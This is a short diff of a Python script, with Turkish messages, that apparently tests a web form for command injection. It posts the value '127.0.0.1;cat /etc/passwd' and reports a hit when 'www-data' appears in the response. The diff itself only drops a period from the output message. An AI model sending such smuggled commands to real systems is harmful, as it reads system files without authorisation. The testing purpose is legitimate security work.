@@ -6,4 +6,4 @@ data = {"ip": "127.0.0.1;cat /etc/passwd", "Submit": "Submit"}
 sonuc = requests.post(url=url, data=data, headers=header)
 
 if "www-data" in str(sonuc.content):
-    print("Command injection vardır.")
+    print("Command injection vardır")
